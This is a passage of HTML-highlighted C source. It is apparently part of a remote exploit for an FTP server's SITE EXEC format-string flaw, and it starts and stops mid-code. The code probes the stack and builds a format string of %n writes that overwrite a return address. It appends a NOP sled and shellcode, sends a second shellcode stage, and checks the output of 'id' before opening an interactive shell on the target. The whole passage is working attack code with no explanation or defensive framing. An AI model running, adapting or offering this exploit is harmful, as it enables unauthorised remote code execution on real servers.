        </span><span class="sc11">strcat</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">popstackbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"%.f"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">xpb_double</span><span class="sc0"> </span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">--</span><span class="sc11">i</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc11">strcat</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">popstackbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"%d"</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc11">memset</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc7">'\x00'</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sbuf</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">sprintf</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"SITE EXEC 7 "</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc11">xpad_cat</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">retloc</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">strcat</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">popstackbuf</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc11">strcat</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"|%.4s|"</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc11">net_write</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ftpsock</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"%s\n"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">sbuf</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc11">memset</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">rbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc7">'\x00'</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">rbuf</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">net_rlinet</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ftpsock</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">rbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">rbuf</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">20</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&lt;=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">exit</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">EXIT_FAILURE</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc11">ftp_recv_until</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ftpsock</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"200 "</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc11">sn</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">strchr</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">rbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc7">'|'</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sn</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc11">sn</span><span class="sc10">++;</span><span class="sc0">

    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sn</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc7">'|'</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc11">sn</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc7">'|'</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc11">sn</span><span class="sc10">[</span><span class="sc4">2</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc7">'|'</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc11">sn</span><span class="sc10">[</span><span class="sc4">3</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc7">'|'</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">(*((</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc0"> </span><span class="sc11">sn</span><span class="sc10">));</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc16">void</span><span class="sc0">
</span><span class="sc11">ftp_exploit</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">ftpsock</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0">     </span><span class="sc11">i</span><span class="sc10">,</span><span class="sc0">
            </span><span class="sc11">wlen</span><span class="sc10">,</span><span class="sc0">
            </span><span class="sc11">tow</span><span class="sc10">,</span><span class="sc0">
            </span><span class="sc11">rem</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0">   </span><span class="sc11">popstackbuf</span><span class="sc10">[</span><span class="sc4">512</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0">   </span><span class="sc11">sbuf</span><span class="sc10">[</span><span class="sc4">512</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0">   </span><span class="sc11">rbuf</span><span class="sc10">[</span><span class="sc4">512</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0">   </span><span class="sc11">retaddr</span><span class="sc10">[</span><span class="sc4">4</span><span class="sc10">];</span><span class="sc0">


    </span><span class="sc11">xpb_quad</span><span class="sc0"> </span><span class="sc10">-=</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">xpb_double</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">xpb_double</span><span class="sc0"> </span><span class="sc10">&gt;=</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">xpb_quad</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">xpb_double</span><span class="sc0"> </span><span class="sc10">/</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">xpb_double</span><span class="sc0"> </span><span class="sc10">%=</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc11">retaddr</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">xp_retaddr</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc4">0x000000ff</span><span class="sc10">)</span><span class="sc0">      </span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">retaddr</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">xp_retaddr</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc4">0x0000ff00</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&gt;&gt;</span><span class="sc0">  </span><span class="sc4">8</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">retaddr</span><span class="sc10">[</span><span class="sc4">2</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">xp_retaddr</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc4">0x00ff0000</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&gt;&gt;</span><span class="sc0"> </span><span class="sc4">16</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">retaddr</span><span class="sc10">[</span><span class="sc4">3</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">xp_retaddr</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc4">0xff000000</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&gt;&gt;</span><span class="sc0"> </span><span class="sc4">24</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">wlen</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">ftp_getwlen</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ftpsock</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">wlen</span><span class="sc0"> </span><span class="sc10">-=</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">memset</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">popstackbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc7">'\x00'</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">popstackbuf</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">xpb_align</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">--</span><span class="sc11">i</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc11">strcat</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">popstackbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"z"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">xpb_quad</span><span class="sc0"> </span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">--</span><span class="sc11">i</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc11">strcat</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">popstackbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"%.f"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">xpb_double</span><span class="sc0"> </span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">--</span><span class="sc11">i</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc11">strcat</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">popstackbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"%d"</span><span class="sc10">);</span><span class="sc0">


    </span><span class="sc11">memset</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc7">'\x00'</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sbuf</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">sprintf</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"SITE EXEC 7 "</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">xpad_cat</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">xp_retloc</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">xpad_cat</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x73507350</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">xpad_cat</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">xp_retloc</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">xpad_cat</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x73507350</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">xpad_cat</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">xp_retloc</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">xpad_cat</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x73507350</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">xpad_cat</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">xp_retloc</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">3</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">strcat</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">popstackbuf</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc1">/* create the paddings
     */</span><span class="sc0">
    </span><span class="sc11">tow</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">retaddr</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">0x100</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">wlen</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc4">0x100</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc4">0x100</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">tow</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">10</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">tow</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc4">0x100</span><span class="sc10">;</span><span class="sc0"> 
    </span><span class="sc11">sprintf</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sbuf</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sbuf</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc6">"%%%dd%%n"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">tow</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">wlen</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">tow</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">tow</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">retaddr</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">0x100</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">wlen</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc4">0x100</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc4">0x100</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">tow</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">10</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">tow</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc4">0x100</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">sprintf</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sbuf</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sbuf</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc6">"%%%dd%%n"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">tow</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">wlen</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">tow</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">tow</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">retaddr</span><span class="sc10">[</span><span class="sc4">2</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">0x100</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">wlen</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc4">0x100</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc4">0x100</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">tow</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">10</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">tow</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc4">0x100</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">sprintf</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sbuf</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sbuf</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc6">"%%%dd%%n"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">tow</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">wlen</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">tow</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">tow</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">retaddr</span><span class="sc10">[</span><span class="sc4">3</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">0x100</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">wlen</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc4">0x100</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc4">0x100</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">tow</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">10</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">tow</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc4">0x100</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">sprintf</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sbuf</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sbuf</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc6">"%%%dd%%n"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">tow</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">wlen</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">tow</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">rem</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">510</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sbuf</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">rem</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">FTP_shellcode</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">exit</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">EXIT_FAILURE</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">strlen</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">FTP_shellcode2</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&gt;=</span><span class="sc0"> </span><span class="sc4">0xff</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">exit</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">EXIT_FAILURE</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">rem</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">FTP_shellcode</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">--</span><span class="sc11">i</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc11">strcat</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"\x90"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">strcat</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FTP_shellcode</span><span class="sc10">);</span><span class="sc0">


    </span><span class="sc11">net_write</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ftpsock</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"%s\n"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">sbuf</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">net_rlinet</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ftpsock</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">rbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">rbuf</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">20</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">sleep</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">net_write</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ftpsock</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"%s\n"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FTP_shellcode2</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">sleep</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc4">2</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc11">net_write</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ftpsock</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"id;\n"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">FTP_shell</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ftpsock</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc9">#if 1
</span><span class="sc0">    </span><span class="sc11">memset</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">rbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc7">'\x00'</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">rbuf</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">net_rlinet</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ftpsock</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">rbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">rbuf</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">20</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&lt;=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">

        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">memcmp</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">rbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"uid="</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">FTP_shell</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ftpsock</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
